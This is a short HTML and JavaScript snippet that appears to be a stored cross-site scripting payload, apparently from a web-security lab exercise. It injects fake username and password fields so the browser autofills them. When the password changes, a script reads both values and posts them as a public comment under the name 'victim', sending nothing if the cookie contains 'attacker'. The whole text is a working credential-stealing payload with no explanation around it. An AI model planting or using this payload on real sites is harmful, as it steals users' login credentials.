<input id="username" type="username" name="username">
<input id="password" type="password" name="password" onchange="postComment()">
<script>
    function postComment()
    {
        if (!document.cookie.includes('attacker'))
        {
            var formData = new FormData(document.forms[0]);
            formData.set('comment', `${username.value} ### ${password.value}`);
            formData.set('name', 'victim');
            formData.set('email', 'victim@hacked.com');
            fetch('/post/comment', { method: 'POST', body: formData });
        }
    }
</script>
